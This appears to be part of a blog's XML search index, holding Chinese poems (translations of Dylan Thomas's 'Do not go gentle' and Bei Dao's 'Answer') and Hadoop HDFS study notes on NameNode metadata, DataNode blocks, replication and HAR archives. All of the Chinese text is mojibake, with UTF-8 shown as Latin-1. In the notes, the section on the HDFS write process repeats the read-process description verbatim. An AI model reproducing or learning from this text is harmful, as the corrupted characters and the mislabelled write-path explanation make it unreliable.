ç‹‚æš´çš„äººæŠ“ä½å¹¶æ­Œå”±è¿‡ç¿±ç¿”çš„å¤ªé˜³ï¼Œ æ‡‚å¾—ï¼Œä½†ä¸ºæ—¶å¤ªæ™šï¼Œä»–ä»¬ä½¿å¤ªé˜³åœ¨é€”ä¸­æ‚²ä¼¤ï¼Œ ä¹Ÿå¹¶ä¸æ¸©å’Œåœ°èµ°è¿›é‚£ä¸ªè‰¯å¤œã€‚ ä¸¥è‚ƒçš„äººï¼Œæ¥è¿‘æ­»äº¡ï¼Œç”¨ç‚«ç›®çš„è§†è§‰çœ‹å‡º å¤±æ˜çš„è·Ÿç›å¯ä»¥åƒæµæ˜Ÿä¸€æ ·é—ªè€€æ¬¢æ¬£ï¼Œ æ€’æ–¥ï¼Œæ•æ–¥å…‰æ˜çš„æ¶ˆé€ã€‚ æ‚¨å•Šï¼Œæˆ‘çš„çˆ¶äº²ï¼Œåœ¨é‚£æ‚²å“€çš„é«˜å¤„ã€‚ ç°åœ¨ç”¨æ‚¨çš„çƒ­æ³ªè¯…å’’æˆ‘ï¼Œç¥ç¦æˆ‘å§ã€‚æˆ‘æ±‚æ‚¨ ä¸è¦æ¸©å’Œåœ°èµ°è¿›é‚£ä¸ªè‰¯å¤œã€‚ æ€’æ–¥ï¼Œæ€’æ–¥å…‰æ˜çš„æ¶ˆé€ ã€Šä¸è¦æ¸©é¡ºåœ°èµ°å…¥é‚£é•¿å¤œã€‹ -å’Œèœå¤´è¯‘æœ¬ ç™½æ—¥å°†å°½ï¼Œæš®å¹´ä»åº”ç‡ƒçƒ§å’†å“® ç‹‚æ€’å§ï¼Œç‹‚æ€’å§ï¼ å¯¹æŠ—ç€å…‰æ˜æ¸é€ è™½ç„¶æ™ºè€…æ·±çŸ¥ äººä¹‹å°†æ­»ï¼Œé»‘æš—è‡ªæœ‰å…¶æ—¶ åªå› ä»–ä»¬æ‰€è¨€æœªæ›¾è£‚å¤©å¦‚ç”µ ä»–ä»¬ä¸è¦æ¸©é¡ºåœ°èµ°å…¥é‚£é•¿å¤œ éšç€æœ€åä¸€æµªï¼Œå–„äººåœ¨å“­å–Š å“­å–Šé‚£è„†å¼±çš„å–„è¡Œ å®ƒæœ¬åº”ä½•å…¶æ¬¢å¿« åœ¨ç»¿è‰²å³¡æ¹¾é‡Œèµ·èˆ ç‹‚æ€’å§ï¼Œç‹‚æ€’å§ï¼ å¯¹æŠ—ç€å…‰æ˜æ¸é€ã€‚ ç‹‚äººæ›¾æŠ“ä½é£é©°çš„å¤ªé˜³ æ”¾å£°æ­Œå”± å¤ªæ™šï¼Œä»–ä»¬æ‰æ„Ÿåˆ°å…¶ä¸­çš„ä¼¤æ„Ÿ ä¸è¦æ¸©é¡ºåœ°èµ°è¿›é‚£é•¿å¤œ ä¸¥è‚ƒçš„äººè¡Œå°†æ­»å»æ—¶ ç”¨é‚£æ¸æ¸å¤±ç¥çš„ç›®å…‰å»çœ‹ ç›²ç³å´å¦‚æµæ˜Ÿç’€ç’¨ï¼Œæ¬¢æ¬£æº¢æ»¡ ç‹‚æ€’å§ï¼Œç‹‚æ€’å§ï¼ å¯¹æŠ—ç€å…‰æ˜æ¸é€ è¿˜æœ‰ä½ å•Šï¼Œæˆ‘çš„çˆ¶äº²ï¼Œè¿œåœ¨æ‚²ä¼¤çš„é«˜åœ° æˆ‘æ³è¯·ä½ ç°åœ¨ å°±è®©ä½ è¯…å’’ï¼Œä½ çš„ç¥ç¦ éšç€çƒ­æ³ªè½ä¸‹ ä¸è¦æ¸©é¡ºåœ°èµ°è¿›é‚£é•¿å¤œ ç‹‚æ€’å§ï¼Œç‹‚æ€’å§ï¼ å¯¹æŠ—è¿™å…‰æ˜æ¸é€ â€‹ ã€Š ç»ä¸å‘é»‘å¤œè¯·å®‰ã€‹ -é«˜æ™“æ¾è¯‘æœ¬ ç»ä¸å‘é»‘å¤œè¯·å®‰ è€æœ½è¯·äºç™½æ—¥å°½å¤´æ¶…æ§ƒ å’†å“®äºå…‰ä¹‹æ¶ˆæ•£ å…ˆå“²è™½è´¥äºå¹½æš— è¯—æ­Œç»ˆä¸èƒ½å°†è‹ç©¹ç‚¹ç‡ƒ ç»ä¸å‘é»‘å¤œè¯·å®‰ è´¤è€…èˆè¹ˆäºç¢§æ¹¾ ä¸ºæƒŠæ¶›æ·¹æ²¡çš„å–„è¡Œå“­å–Š å’†å“®äºå…‰ä¹‹æ¶ˆæ•£ ç‹‚è€…å¦‚å¤¸çˆ¶é€æ—¥ é«˜æ­Œä¸­é¡¿è§‰è¿Ÿæ¥çš„ä¼¤æ„Ÿ ç»ä¸å‘é»‘å¤œè¯·å®‰ é€è€…äºä¸´ç»ˆè¿·å¹» ç›²ç³æ€’æ”¾å‡ºæµæ˜Ÿçš„ç¿çƒ‚ å’†å“®äºå…‰ä¹‹æ¶ˆæ•£ é‚£ä¹ˆæ‚¨ï¼Œæˆ‘å‚å‚å°†æ­»çš„çˆ¶äº² è¯·æ¬æœ€åä¸€æ§çƒ­æ³ªé™ä¸´ è¯·è¯…å’’ï¼Œè¯·ä¿ä½‘ æˆ‘ç¥ˆæ„¿ï¼Œç»ä¸å‘ é»‘å¤œè¯·å®‰ï¼Œå’†å“® äºå…‰ä¹‹æ¶ˆæ•£]]></content>
      <categories>
        <category>æ–‡è‰º</category>
        <category>è¯—æ­Œ</category>
      </categories>
      <tags>
        <tag>è¯—æ­Œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoopå­¦ä¹ ç¬”è®°-3 HDFS åŸç†å‰–æ]]></title>
    <url>%2F2018%2F06%2F03%2FHadoop%2F1-HDFS%2FHDFS-2-%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90%2F</url>
    <content type="text"><![CDATA[1. HDFSä½“ç³»ç»“æ„ä¸»ä»ã€‚ã€‚ã€‚ 2.NameNodeæ¦‚å¿µ [x] æ˜¯æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ç®¡ç†èŠ‚ç‚¹ã€‚å®ƒç»´æŠ¤ç€æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ç›®å½•æ ‘ï¼Œæ–‡ä»¶/ç›®å½•çš„å…ƒä¿¡æ¯å’Œæ¯ä¸ªæ–‡ä»¶å¯¹åº”çš„æ•°æ®å—åˆ—è¡¨ã€‚æ¥æ”¶ç”¨æˆ·çš„æ“ä½œè¯·æ±‚ã€‚ [x] åœ¨hdfs-site.xmlä¸­çš„dfs.namenode.name.dirå±æ€§ [x] æ–‡ä»¶åŒ…æ‹¬ï¼š [x] æ–‡ä»¶åŒ…æ‹¬: â‘ fsimage:å…ƒæ•°æ®é•œåƒæ–‡ä»¶ã€‚å­˜å‚¨æŸä¸€æ—¶æ®µNameNodeå†…å­˜å…ƒæ•°æ®ä¿¡æ¯ã€‚ â‘¡edits:æ“ä½œæ—¥å¿—æ–‡ä»¶ã€‚ â‘¢fstime:ä¿å­˜æœ€è¿‘ä¸€æ¬¡checkpointçš„æ—¶é—´ ä»¥ä¸Šè¿™äº›æ–‡ä»¶æ˜¯ä¿å­˜åœ¨linuxçš„æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚ æŸ¥çœ‹ fsimage å’Œ editsçš„å†…å®¹ æŸ¥çœ‹ NameNodeä¸­ fsimage çš„å†…å®¹ æŸ¥çœ‹ fsimageé•œåƒæ–‡ä»¶å†…å®¹Usage: bin/hdfs oiv [OPTIONS] -i INPUTFILE -o OUTPUTFILE 1234567891011121314# å¯ä»¥çŸ¥é“æ•°æ®å­˜åœ¨é‚£ä¸ªå“ªä¸ª fsimage é•œåƒä¸­------------------------------------# ä½¿ç”¨ç¦»çº¿çš„æŸ¥çœ‹å™¨ è¾“å‡ºåˆ°ç½‘é¡µæŸ¥çœ‹oiv -i hadoopdata/namenode/current/fsimage_0000000000000000250 -o 0000000000000000250# å‡ºç°è¿™æ ·çš„æç¤ºINFO offlineImageViewer.WebImageViewer: WebImageViewer started. Listening on /127.0.0.1:5978. Press Ctrl+C to stop the viewer.# å¦èµ·ä¸€ä¸ªçª—å£æŸ¥çœ‹hadoop fs -ls -R webhdfs://127.0.0.1:5978------------------------------------# ä¹Ÿå¯ä»¥å¯¼å‡ºåˆ° xml æ–‡ä»¶bin/hdfs oiv -p XML -i tmp/dfs/name/current/fsimage_0000000000000000055 -o fsimage.xml æŸ¥çœ‹editsæ–‡ä»¶ï¼Œ ä¹Ÿå¯ä»¥å¯¼å‡ºåˆ° xml 12# æŸ¥çœ‹edtiså†…å®¹bin/hdfs oev -i tmp/dfs/name/current/edits_0000000000000000057-0000000000000000186 -o edits.xml 3. Datanodeæä¾›çœŸå®æ–‡ä»¶æ•°æ®çš„å­˜å‚¨æœåŠ¡ Datanode èŠ‚ç‚¹çš„æ•°æ®åˆ‡å—å­˜å‚¨ä½ç½® ~/hadoopdata/datanode/current/BP-1070660005-192.168.170.131-1527865615372/current/finalized/subdir0/subdir0 12345678[ap@cs2]~/hadoopdata/datanode/current/BP-1070660005-192.168.170.131-1527865615372/current/finalized/subdir0/subdir0% llæ€»ç”¨é‡ 213340-rw-r--r-- 1 ap ap 134217728 6æœˆ 2 13:35 blk_1073741842-rw-r--r-- 1 ap ap 1048583 6æœˆ 2 13:35 blk_1073741842_1018.meta-rw-r--r-- 1 ap ap 82527955 6æœˆ 2 13:35 blk_1073741843-rw-r--r-- 1 ap ap 644759 6æœˆ 2 13:35 blk_1073741843_1019.meta-rw-r--r-- 1 ap ap 13 6æœˆ 3 02:12 blk_1073741850-rw-r--r-- 1 ap ap 11 6æœˆ 3 02:12 blk_1073741850_1028.meta æ–‡ä»¶å—ï¼ˆblockï¼‰ï¼šæœ€åŸºæœ¬çš„å­˜å‚¨å•ä½ã€‚å¯¹äºæ–‡ä»¶å†…å®¹è€Œè¨€ï¼Œä¸€ä¸ªæ–‡ä»¶çš„é•¿åº¦å¤§å°æ˜¯sizeï¼Œé‚£ä¹ˆä»æ–‡ä»¶çš„ï¼åç§»å¼€å§‹ï¼ŒæŒ‰ç…§å›ºå®šçš„å¤§å°ï¼Œé¡ºåºå¯¹æ–‡ä»¶è¿›è¡Œåˆ’åˆ†å¹¶ç¼–å·ï¼Œåˆ’åˆ†å¥½çš„æ¯ä¸€ä¸ªå—ç§°ä¸€ä¸ªBlockã€‚HDFSé»˜è®¤Blockå¤§å°æ˜¯128MBï¼Œä»¥ä¸€ä¸ª256MBæ–‡ä»¶ï¼Œå…±æœ‰256/128=2ä¸ªBlock. ä¸åŒäºæ™®é€šæ–‡ä»¶ç³»ç»Ÿçš„æ˜¯ï¼ŒHDFSä¸­ï¼Œå¦‚æœä¸€ä¸ªæ–‡ä»¶å°äºä¸€ä¸ªæ•°æ®å—çš„å¤§å°ï¼Œå¹¶ä¸å ç”¨æ•´ä¸ªæ•°æ®å—å­˜å‚¨ç©ºé—´, æŒ‰æ–‡ä»¶å¤§å°çš„å®é™…å®¹é‡å­˜å‚¨ Replicationã€‚å¤šå¤æœ¬ã€‚é»˜è®¤æ˜¯ä¸‰ä¸ªã€‚ hdfs-site.xmlçš„dfs.replicationå±æ€§ æ‰‹åŠ¨è®¾ç½®æŸä¸ªæ–‡ä»¶çš„å‰¯æœ¬æ•°ä¸º3ä¸ª bin/hdfs dfs -setrep 3 /a.txt 4. æ•°æ®å­˜å‚¨ï¼š å†™æ–‡ä»¶è§£æ [x] ç–‘ç‚¹ï¼š HDFS clientä¸Šä¼ æ•°æ®åˆ°HDFSæ—¶ï¼Œä¼šé¦–å…ˆåœ¨æœ¬åœ°ç¼“å­˜æ•°æ®ï¼Œå½“æ•°æ®è¾¾åˆ°ä¸€ä¸ªblockå¤§å°æ—¶ï¼Œè¯·æ±‚NameNodeåˆ†é…ä¸€ä¸ªblockã€‚NameNodeä¼šæŠŠblockæ‰€åœ¨çš„DataNodeçš„åœ°å€å‘Šè¯‰HDFS clientã€‚HDFS clientä¼šç›´æ¥å’ŒDataNodeé€šä¿¡ï¼ŒæŠŠæ•°æ®å†™åˆ°DataNodeèŠ‚ç‚¹ä¸€ä¸ªblockæ–‡ä»¶ä¸­ã€‚ é—®é¢˜ï¼š å¦‚æœä¸€ç›´å†™çš„æ•°æ®éƒ½æ²¡æœ‰è¾¾åˆ°ä¸€ä¸ª block å¤§å°ï¼Œ é‚£æ€ä¹ˆå­˜å‚¨ï¼Ÿï¼Ÿ å†™æ–‡ä»¶çš„è¿‡ç¨‹ï¼š é¦–å…ˆè°ƒç”¨FileSystemå¯¹è±¡çš„openæ–¹æ³•ï¼Œå…¶å®æ˜¯ä¸€ä¸ªDistributedFileSystemçš„å®ä¾‹ DistributedFileSystemé€šè¿‡rpcè·å¾—æ–‡ä»¶çš„ç¬¬ä¸€æ‰¹ä¸ªblockçš„locationsï¼ŒåŒä¸€blockæŒ‰ç…§é‡å¤æ•°ä¼šè¿”å›å¤šä¸ªlocationsï¼Œè¿™äº›locationsæŒ‰ç…§hadoopæ‹“æ‰‘ç»“æ„æ’åºï¼Œè·ç¦»å®¢æˆ·ç«¯è¿‘çš„æ’åœ¨å‰é¢. å‰ä¸¤æ­¥ä¼šè¿”å›ä¸€ä¸ªFSDataInputStreamå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¼šè¢«å°è£…æˆDFSInputStreamå¯¹è±¡ï¼ŒDFSInputStreamå¯ä»¥æ–¹ä¾¿çš„ç®¡ç†datanodeå’Œnamenodeæ•°æ®æµã€‚å®¢æˆ·ç«¯è°ƒç”¨readæ–¹æ³•ï¼ŒDFSInputStreamæœ€ä¼šæ‰¾å‡ºç¦»å®¢æˆ·ç«¯æœ€è¿‘çš„datanodeå¹¶è¿æ¥ã€‚ æ•°æ®ä»datanodeæºæºä¸æ–­çš„æµå‘å®¢æˆ·ç«¯ã€‚ å¦‚æœç¬¬ä¸€å—çš„æ•°æ®è¯»å®Œäº†ï¼Œå°±ä¼šå…³é—­æŒ‡å‘ç¬¬ä¸€å—çš„datanodeè¿æ¥ï¼Œæ¥ç€è¯»å–ä¸‹ä¸€å—ã€‚è¿™äº›æ“ä½œå¯¹å®¢æˆ·ç«¯æ¥è¯´æ˜¯é€æ˜çš„ï¼Œå®¢æˆ·ç«¯çš„è§’åº¦çœ‹æ¥åªæ˜¯è¯»ä¸€ä¸ªæŒç»­ä¸æ–­çš„æµã€‚ å¦‚æœç¬¬ä¸€æ‰¹blockéƒ½è¯»å®Œäº†ï¼ŒDFSInputStreamå°±ä¼šå»namenodeæ‹¿ä¸‹ä¸€æ‰¹blocksçš„locationï¼Œç„¶åç»§ç»­è¯»ï¼Œå¦‚æœæ‰€æœ‰çš„å—éƒ½è¯»å®Œï¼Œè¿™æ—¶å°±ä¼šå…³é—­æ‰æ‰€æœ‰çš„æµã€‚ å¦‚æœåœ¨è¯»æ•°æ®çš„æ—¶å€™ï¼ŒDFSInputStreamå’Œdatanodeçš„é€šè®¯å‘ç”Ÿå¼‚å¸¸ï¼Œå°±ä¼šå°è¯•æ­£åœ¨è¯»çš„blockçš„æ’ç¬¬äºŒè¿‘çš„datanode,å¹¶ä¸”ä¼šè®°å½•å“ªä¸ªdatanodeå‘ç”Ÿé”™è¯¯ï¼Œå‰©ä½™çš„blocksè¯»çš„æ—¶å€™å°±ä¼šç›´æ¥è·³è¿‡è¯¥datanodeã€‚DFSInputStreamä¹Ÿä¼šæ£€æŸ¥blockæ•°æ®æ ¡éªŒå’Œï¼Œå¦‚æœå‘ç°ä¸€ä¸ªåçš„block,å°±ä¼šå…ˆæŠ¥å‘Šåˆ°namenodeèŠ‚ç‚¹ï¼Œç„¶åDFSInputStreamåœ¨å…¶ä»–çš„datanodeä¸Šè¯»è¯¥blockçš„é•œåƒ è¯¥è®¾è®¡çš„æ–¹å‘å°±æ˜¯å®¢æˆ·ç«¯ç›´æ¥è¿æ¥datanodeæ¥æ£€ç´¢æ•°æ®å¹¶ä¸”namenodeæ¥è´Ÿè´£ä¸ºæ¯ä¸€ä¸ªblockæä¾›æœ€ä¼˜çš„datanodeï¼Œnamenodeä»…ä»…å¤„ç†block locationçš„è¯·æ±‚ï¼Œè¿™äº›ä¿¡æ¯éƒ½åŠ è½½åœ¨namenodeçš„å†…å­˜ä¸­ï¼Œhdfsé€šè¿‡datanodeé›†ç¾¤å¯ä»¥æ‰¿å—å¤§é‡å®¢æˆ·ç«¯çš„å¹¶å‘è®¿é—®ã€‚ 5. æ•°æ®å­˜å‚¨ï¼š è¯»æ–‡ä»¶è§£æ è¯»æ–‡ä»¶çš„è¿‡ç¨‹ é¦–å…ˆè°ƒç”¨FileSystemå¯¹è±¡çš„openæ–¹æ³•ï¼Œå…¶å®æ˜¯ä¸€ä¸ªDistributedFileSystemçš„å®ä¾‹ DistributedFileSystemé€šè¿‡rpcè·å¾—æ–‡ä»¶çš„ç¬¬ä¸€æ‰¹ä¸ªblockçš„locationsï¼ŒåŒä¸€blockæŒ‰ç…§é‡å¤æ•°ä¼šè¿”å›å¤šä¸ªlocationsï¼Œè¿™äº›locationsæŒ‰ç…§hadoopæ‹“æ‰‘ç»“æ„æ’åºï¼Œè·ç¦»å®¢æˆ·ç«¯è¿‘çš„æ’åœ¨å‰é¢. å‰ä¸¤æ­¥ä¼šè¿”å›ä¸€ä¸ªFSDataInputStreamå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¼šè¢«å°è£…æˆDFSInputStreamå¯¹è±¡ï¼ŒDFSInputStreamå¯ä»¥æ–¹ä¾¿çš„ç®¡ç†datanodeå’Œnamenodeæ•°æ®æµã€‚å®¢æˆ·ç«¯è°ƒç”¨readæ–¹æ³•ï¼ŒDFSInputStreamæœ€ä¼šæ‰¾å‡ºç¦»å®¢æˆ·ç«¯æœ€è¿‘çš„datanodeå¹¶è¿æ¥ã€‚ æ•°æ®ä»datanodeæºæºä¸æ–­çš„æµå‘å®¢æˆ·ç«¯ã€‚ å¦‚æœç¬¬ä¸€å—çš„æ•°æ®è¯»å®Œäº†ï¼Œå°±ä¼šå…³é—­æŒ‡å‘ç¬¬ä¸€å—çš„datanodeè¿æ¥ï¼Œæ¥ç€è¯»å–ä¸‹ä¸€å—ã€‚è¿™äº›æ“ä½œå¯¹å®¢æˆ·ç«¯æ¥è¯´æ˜¯é€æ˜çš„ï¼Œå®¢æˆ·ç«¯çš„è§’åº¦çœ‹æ¥åªæ˜¯è¯»ä¸€ä¸ªæŒç»­ä¸æ–­çš„æµã€‚ å¦‚æœç¬¬ä¸€æ‰¹blockéƒ½è¯»å®Œäº†ï¼ŒDFSInputStreamå°±ä¼šå»namenodeæ‹¿ä¸‹ä¸€æ‰¹blocksçš„locationï¼Œç„¶åç»§ç»­è¯»ï¼Œå¦‚æœæ‰€æœ‰çš„å—éƒ½è¯»å®Œï¼Œè¿™æ—¶å°±ä¼šå…³é—­æ‰æ‰€æœ‰çš„æµã€‚ å¦‚æœåœ¨è¯»æ•°æ®çš„æ—¶å€™ï¼ŒDFSInputStreamå’Œdatanodeçš„é€šè®¯å‘ç”Ÿå¼‚å¸¸ï¼Œå°±ä¼šå°è¯•æ­£åœ¨è¯»çš„blockçš„æ’ç¬¬äºŒè¿‘çš„datanode,å¹¶ä¸”ä¼šè®°å½•å“ªä¸ªdatanodeå‘ç”Ÿé”™è¯¯ï¼Œå‰©ä½™çš„blocksè¯»çš„æ—¶å€™å°±ä¼šç›´æ¥è·³è¿‡è¯¥datanodeã€‚DFSInputStreamä¹Ÿä¼šæ£€æŸ¥blockæ•°æ®æ ¡éªŒå’Œï¼Œå¦‚æœå‘ç°ä¸€ä¸ªåçš„block,å°±ä¼šå…ˆæŠ¥å‘Šåˆ°namenodeèŠ‚ç‚¹ï¼Œç„¶åDFSInputStreamåœ¨å…¶ä»–çš„datanodeä¸Šè¯»è¯¥blockçš„é•œåƒ è¯¥è®¾è®¡çš„æ–¹å‘å°±æ˜¯å®¢æˆ·ç«¯ç›´æ¥è¿æ¥datanodeæ¥æ£€ç´¢æ•°æ®å¹¶ä¸”namenodeæ¥è´Ÿè´£ä¸ºæ¯ä¸€ä¸ªblockæä¾›æœ€ä¼˜çš„datanodeï¼Œnamenodeä»…ä»…å¤„ç†block locationçš„è¯·æ±‚ï¼Œè¿™äº›ä¿¡æ¯éƒ½åŠ è½½åœ¨namenodeçš„å†…å­˜ä¸­ï¼Œhdfsé€šè¿‡datanodeé›†ç¾¤å¯ä»¥æ‰¿å—å¤§é‡å®¢æˆ·ç«¯çš„å¹¶å‘è®¿é—®ã€‚ 6.Hadoop Archives ï¼ˆHAR filesï¼‰Hadoop Archives (HAR files)æ˜¯åœ¨0.18.0ç‰ˆæœ¬ä¸­å¼•å…¥çš„ï¼Œå®ƒçš„å‡ºç°å°±æ˜¯ä¸ºäº†ç¼“è§£å¤§é‡å°æ–‡ä»¶æ¶ˆè€—namenodeå†…å­˜çš„é—®é¢˜ã€‚HARæ–‡ä»¶æ˜¯é€šè¿‡åœ¨HDFSä¸Šæ„å»ºä¸€ä¸ªå±‚æ¬¡åŒ–çš„æ–‡ä»¶ç³»ç»Ÿæ¥å·¥ä½œã€‚ä¸€ä¸ªHARæ–‡ä»¶æ˜¯é€šè¿‡hadoopçš„archiveå‘½ä»¤æ¥åˆ›å»ºï¼Œè€Œè¿™ä¸ªå‘½ä»¤å® é™…ä¸Šä¹Ÿæ˜¯è¿è¡Œäº†ä¸€ä¸ªMapReduceä»»åŠ¡æ¥å°†å°æ–‡ä»¶æ‰“åŒ…æˆHARã€‚å¯¹äºclientç«¯æ¥è¯´ï¼Œä½¿ç”¨HARæ–‡ä»¶æ²¡æœ‰ä»»ä½•å½±å“ã€‚æ‰€æœ‰çš„åŸå§‹æ–‡ä»¶éƒ½ ï¼ˆusing har://URLï¼‰ã€‚ä½†åœ¨HDFSç«¯å®ƒå†…éƒ¨çš„æ–‡ä»¶æ•°å‡å°‘äº†ã€‚ é€šè¿‡HARæ¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸ä¼šæ¯”ç›´æ¥ä»HDFSä¸­è¯»å–æ–‡ä»¶é«˜æ•ˆï¼Œè€Œä¸”å®é™…ä¸Šå¯èƒ½è¿˜ä¼šç¨å¾®ä½æ•ˆä¸€ç‚¹ï¼Œå› ä¸ºå¯¹æ¯ä¸€ä¸ªHARæ–‡ä»¶çš„è®¿é—®éƒ½éœ€è¦å®Œæˆä¸¤å±‚ indexæ–‡ä»¶çš„è¯»å–å’Œæ–‡ä»¶æœ¬èº«æ•°æ®çš„è¯»å–ã€‚å¹¶ä¸”å°½ç®¡HARæ–‡ä»¶å¯ä»¥è¢«ç”¨æ¥ä½œä¸ºMapReduce jobçš„inputï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ç‰¹æ®Šçš„æ–¹æ³•æ¥ä½¿mapså°†HARæ–‡ä»¶ä¸­æ‰“åŒ…çš„æ–‡ä»¶å½“ä½œä¸€ä¸ªHDFSæ–‡ä»¶å¤„ç†ã€‚ æ‰“åŒ…å‡ºæ¥çš„ har æ–‡ä»¶åœ¨xxx.har/part-0 ä¸­ï¼Œ contentz-size è·ŸåŸæ¥çš„æ–‡ä»¶æ€»å¤§å°ä¸€æ · åˆ›å»ºæ–‡ä»¶ hadoop archive -archiveName xxx.har -p /src /destæŸ¥çœ‹å†…å®¹ hadoop fs -lsr har:///dest/xxx.har å¯ä»¥åŸå°ä¸åŠ¨çš„æ˜¾ç¤ºå‡ºæ¥ 123456789101112131415# æ‰“åŒ…æˆ harhadoop archive -archiveName test.har -p /user/test /# æŸ¥çœ‹har æ–‡ä»¶[ap@cs1]~% hadoop fs -count /test.har/part-0 0(ç›®å½•æ•°) 1(æ–‡ä»¶æ•°) 72(æ–‡ä»¶å¤§å°) /test.har/part-0 (æ–‡ä»¶å)# æŸ¥çœ‹æ‰“åŒ…å‰æ–‡ä»¶[ap@cs1]~% hadoop fs -count /user/test 1 2 72 /user/test # æŸ¥çœ‹ har æ–‡ä»¶ï¼Œ æŠŠæ‰“åŒ…å‰çš„åŸæœ¬æ–‡ä»¶éƒ½æ˜¾ç¤ºå‡ºæ¥äº†[ap@cs1]~% hadoop fs -ls -R har:///test.har-rw-r--r-- 3 ap supergroup 50 2018-06-03 04:24 har:///test.har/a.txt-rw-r--r-- 3 ap supergroup 22 2018-06-03 04:24 har:///test.har/b.txt æ³¨æ„ç‚¹ï¼š å­˜å‚¨å±‚é¢ï¼šä¸ºäº†è§£å†³å°æ–‡ä»¶è¿‡å¤šå¯¼è‡´çš„ Namenode å‹åŠ›è¿‡å¤§é—®é¢˜ï¼Œ æŠŠå¾ˆå¤šå°æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ª har æ–‡ä»¶ã€‚ ä½¿ç”¨å±‚é¢ï¼š ä½†æ˜¯å®é™…å¤„ç†çš„æ—¶å€™ï¼Œ è¿˜æ˜¯ä¼šè¿˜åŸå‡ºåŸæœ¬çš„å°æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ ä¸ä¼šæŠŠ har æ–‡ä»¶å½“æˆä¸€ä¸ª HDFS æ–‡ä»¶å¤„ç†ã€‚ HDFS ä¸Šä¸æ”¯æŒ tarï¼Œ åªæ”¯æŒ haræ‰“åŒ… 7.HDFS çš„ HA]]></content>
      <categories>
        <category>Hadoop</category>
        <category>HDFS</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>HDFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[â–å›ç­”]]></title>
    <url>%2F2018%2F06%2F03%2FPoetry%2F%E5%9B%9E%E7%AD%94%2F</url>
    <content type="text"><![CDATA[å‘é„™æ˜¯å‘é„™è€…çš„é€šè¡Œè¯ï¼Œé«˜å°šæ˜¯é«˜å°šè€…çš„å¢“å¿—é“­ï¼Œçœ‹å§ï¼Œåœ¨é‚£é•€é‡‘çš„å¤©ç©ºä¸­ï¼Œé£˜æ»¡äº†æ­»è€…å¼¯æ›²çš„å€’å½±ã€‚ å†°å·çºªè¿‡å»äº†ï¼Œä¸ºä»€ä¹ˆåˆ°å¤„éƒ½æ˜¯å†°å‡Œï¼Ÿå¥½æœ›è§’å‘ç°äº†ï¼Œä¸ºä»€ä¹ˆæ­»æµ·é‡Œåƒå¸†ç›¸ç«ï¼Ÿ æˆ‘æ¥åˆ°è¿™ä¸ªä¸–ç•Œä¸Šï¼Œåªå¸¦ç€çº¸ã€ç»³ç´¢å’Œèº«å½±ï¼Œä¸ºäº†åœ¨å®¡åˆ¤ä¹‹å‰ï¼Œå®£è¯»é‚£äº›è¢«åˆ¤å†³çš„å£°éŸ³ã€‚ å‘Šè¯‰ä½ å§ï¼Œä¸–ç•Œæˆ‘â€“ä¸â€“ç›¸â€“ä¿¡ï¼çºµä½¿ä½ è„šä¸‹æœ‰ä¸€åƒåæŒ‘æˆ˜è€…ï¼Œé‚£å°±æŠŠæˆ‘ç®—ä½œç¬¬ä¸€åƒé›¶ä¸€åã€‚ æˆ‘ä¸ç›¸ä¿¡å¤©æ˜¯è“çš„ï¼Œæˆ‘ä¸ç›¸ä¿¡é›·çš„å›å£°ï¼Œæˆ‘ä¸ç›¸ä¿¡æ¢¦æ˜¯å‡çš„ï¼Œæˆ‘ä¸ç›¸ä¿¡æ­»æ— æŠ¥åº”ã€‚ å¦‚æœæµ·æ´‹æ³¨å®šè¦å†³å ¤ï¼Œå°±è®©æ‰€æœ‰çš„è‹¦æ°´éƒ½æ³¨å…¥æˆ‘å¿ƒä¸­ï¼Œå¦‚æœé™†åœ°æ³¨å®šè¦ä¸Šå‡ï¼Œå°±è®©äººç±»é‡æ–°é€‰æ‹©ç”Ÿå­˜çš„å³°é¡¶ã€‚ æ–°çš„è½¬æœºå’Œé—ªé—ªæ˜Ÿæ–—ï¼Œæ­£åœ¨ç¼€æ»¡æ²¡æœ‰é®æ‹¦çš„å¤©ç©ºã€‚é‚£æ˜¯äº”åƒå¹´çš„è±¡å½¢æ–‡å­—ï¼Œé‚£æ˜¯æœªæ¥äººä»¬å‡è§†çš„çœ¼ç›ã€‚ ä½œè€… / åŒ—å²›]]></content>
      <categories>
        <category>æ–‡è‰º</category>
        <category>è¯—æ­Œ</category>
      </categories>
      <tags>
        <tag>è¯—æ­Œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoopå­¦ä¹ ç¬”è®°-2 HDFSåŸºç¡€å…¥é—¨]]></title>
    <url>%2F2018%2F06%2F02%2FHadoop%2F1-HDFS%2FHDFS-1-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Hadoopçš„æ ¸å¿ƒç»„ä»¶ ä¹‹ HDFSHDFS1. HDFSæ˜¯ä»€ä¹ˆ: åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ 2. HDFS è®¾è®¡æ€æƒ³ åˆ†è€Œæ²»ä¹‹, åˆ‡åˆ†å­˜å‚¨, å½“ä¸€ä¸ªæ–‡ä»¶è¿‡å¤§çš„æ—¶å€™, ä¸€ä¸ªèŠ‚ç‚¹å­˜å‚¨ä¸äº†, é‡‡ç”¨åˆ‡åˆ†å­˜å‚¨ åˆ†å—å­˜å‚¨: æ¯ä¸€ä¸ªå—å«åš block å¦‚æœä¸€ä¸ª8Tçš„æ•°æ®, è¿™ä¸ªæ€ä¹ˆåˆ†åˆé€‚??? è®¾ç½®åˆ†å—çš„æ—¶å€™è¦è€ƒè™‘ä¸€ä¸ªäº‹æƒ… : è´Ÿè½½å‡è¡¡ å—çš„å¤§å°ä¸èƒ½å¤ªå¤§, å¤ªå¤§ä¼šé€ æˆè´Ÿè½½ä¸å‡è¡¡ 